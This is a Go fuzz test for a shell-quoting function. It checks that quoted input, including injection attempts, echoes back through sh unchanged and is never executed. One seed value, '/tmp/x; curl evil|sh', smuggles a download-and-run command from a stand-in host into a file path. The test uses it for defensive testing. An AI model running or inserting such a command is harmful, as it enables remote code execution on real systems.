package sshread

import (
	"bytes"
	"errors"
	"os/exec"
	"strings"
	"testing"
)

// FuzzShQuote is the load-bearing check on the quoting layer: for any input,
// splicing shQuote(s) into the same variable-assignment shape the production
// command uses and echoing it back through a real sh must reproduce the
// input byte-for-byte with exit 0 — any quoting escape would corrupt the
// bytes or make the shell execute something. Inputs containing NUL are
// skipped: \x00 cannot survive execve arguments (not a shQuote defect;
// config validation independently rejects all control characters).
func FuzzShQuote(f *testing.F) {
	seeds := []string{
		"'",
		`'\''`,
		`\`,
		"$()",
		"`",
		"\n",
		"\u009b", // C1 CSI — acts like ESC [ in some terminals
		"/etc/ssh/authorized_keys.d/deploy",
		"~/my keys/auth",
		"/tmp/x; curl evil|sh",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		if strings.ContainsRune(s, 0) {
			t.Skip("NUL cannot survive execve; rejected by config validation")
		}
		cmd := exec.Command("sh", "-c", "p="+shQuote(s)+`; printf %s "$p"`)
		var stderr bytes.Buffer
		cmd.Stderr = &stderr
		out, err := cmd.Output()
		if err != nil {
			var exitErr *exec.ExitError
			if errors.As(err, &exitErr) {
				t.Fatalf("sh exited %d on shQuote(%q): stderr %q", exitErr.ExitCode(), s, stderr.String())
			}
			t.Fatalf("run sh on shQuote(%q): %v", s, err)
		}
		if !bytes.Equal(out, []byte(s)) {
			t.Fatalf("round-trip mismatch: shQuote(%q) came back as %q", s, out)
		}
	})
}
